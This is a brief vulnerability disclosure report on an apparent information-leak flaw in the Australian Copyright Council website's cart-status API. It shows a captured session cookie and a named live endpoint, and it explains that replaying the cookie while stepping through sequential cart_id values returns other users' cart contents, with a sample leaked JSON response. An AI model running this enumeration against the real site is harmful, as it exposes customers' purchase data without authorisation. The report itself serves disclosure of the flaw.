# About Australia Copyright council Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie: __stripe_mid=23f6c489-683b-4271-93f2-01b901c117e3232316; csrftoken=d6YCcSd9CRQ2iSWhBgvtp7Vgo0wXcUUIHRwmrpB23VpsuI8xyQYfYNGHOIiPgwBJ
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: purchase content, date_created,price.

> Request method: GET, information can be obtained by traversing the constructed basket_pk, such as "3289", "3290"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params |
|--------------|---|------------|
| yizhimuzhu666|https://www.copyright.org.au/check_cart_status/?cart_id=3289|card_id=3289|



### Leaked packet cases 
``` 
{
    "status": "200",
    "msg": "cart is open",
    "cart": {
        "status": "Open",
        "basket_pk": 3289,
        "reference": null,
        "customer": "error",
        "customer_number": null,
        "sale_rep": "None",
        "date_created": "2024-02-05",
        "date_submitted": null,
        "lines": [
            {
                "line_pk": 5894,
                "title": "Copyright Essentials",
                "isbn": "9781920778415",
                "quantity": 2,
                "discount": 0,
                "firm_sale": 0,
                "price": "60.00",
                "url": "/browse/book/Australian-Copyright-Council-Staff-Copyright-Essentials-9781920778415",
                "created": "2024-02-05 09:04:38.032102+00:00"
            }
        ],
        "discount_applied": 0,
        "is_book_product": true
    }
}
```